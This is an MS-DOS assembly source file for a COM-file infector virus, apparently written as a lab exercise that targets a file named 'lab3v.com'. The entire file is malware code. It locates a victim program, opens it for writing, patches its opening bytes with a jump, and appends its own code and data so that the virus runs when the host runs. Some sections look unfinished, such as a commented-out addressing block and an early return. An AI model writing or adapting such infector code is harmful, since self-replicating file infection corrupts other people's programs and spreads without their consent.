.model tiny
.code
org 100h
start:

    db 0e9h, 1, 0 ; word-pointer jump
    db 0ffh ; (⌐■_■)

hardcode:

    mov bp, 0

code:

    ; setting dta on file
    mov ah, 1ah
    lea dx, [bp + file]
    int 21h

    ; finding victim file
    lea dx, [bp + file_mask]
    mov ah, 4eh
    int 21h

    ; opening file (file descriptor -> ax)
    lea dx, [bp + file.fname]
    mov ax, 3D02h
    int 21h

    ; output infected filename
    mov al, '$'
    mov file.fname[12], al
    push dx
    lea dx, [bp + file.fname]
    mov ah, 09h
    int 21h
    pop dx
    mov file.fname[12], 0

    ; file error handling
    jnc file_err_skip
    lea dx, [bp + file_err_msg]
    mov ah, 09h
    int 21h
    mov ah, 4ch
    int 21h

file_err_skip:

    ; moving carret to the end to get the payload offset
    mov cx, 0
    mov dx, 0
    mov bx, ax ; file descriptor (ax) -> bx
    mov ax, 4202h
    int 21h
    mov [bp + payload_offset], ax

    ; ; preparing payload addressation
    ; mov al, [bp + payload_offset]
    ; mov ah, 0
    ; add ax, 107h
    ; sub ax, [bp + offset code]
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; reading first 4 bytes:
    mov cx, 4
    lea dx, [bp + leading_bytes]
    mov ah, 3fh
    int 21h
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; inserting load injection
    mov byte_buffer, 0e9h ; word-pointer jmp
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    mov ax, [bp + payload_offset] ; jmp offset
    lea dx, [bp + word_buffer]
    sub ax, 4 ; jmp command size
    mov [bp + word_buffer], ax
    mov ah, 40h
    int 21h
    
    ; moving carret to the end
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    ; writing payload pre_code
    lea dx, b5_buffer
    mov cx, 5
    mov ah, 40h
    int 21h
    
    mov ax, [bp + payload_offset]
    add ax, offset data - offset code + 107h
    mov word_buffer, ax
    lea dx, word_buffer
    mov cx, 2
    mov ah, 40h
    int 21h

    ; writing payload code
    lea dx, code
    add dx, bp
    lea cx, data
    sub cx, offset code
    mov ah, 40h
    int 21h

    ; writing payload data
    lea dx, data
    lea cx, afterall
    sub cx, offset data
    mov ah, 40h
    int 21h

    ; closing file
    mov ah, 3eh
    int 21h
    ret

    mov ah, 4ch
    int 21h

    ; redirect to victim program
    mov ax, 100h
    jmp ax

harddata:

    leading_bytes dd 0b4h, 4ch, 0cdh, 21h

data:
    
    ; 13-byte string for filename
    Str13 struc
    max db 13
    len db ?
    text db 13 dup(?)
    Str13 ends

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    fattr db ?
    ftime dw ?
    fdate dw ?
    fsize dd ?
    fname db 13 dup(?)
    ends
    
    filename Str13 <>
    file DTAFileInfo <>

    b5_buffer db 2eh, 0c7h, 6, 0, 1
    data_local_addr dw ?
    dword_buffer dd ?
    word_buffer dw ?
    byte_buffer db ?
    payload_offset dw ?
    file_mask db 'lab3v.com', 0
    file_err_msg db 'No any file to infect', 13, 10, '$'

afterall:

end start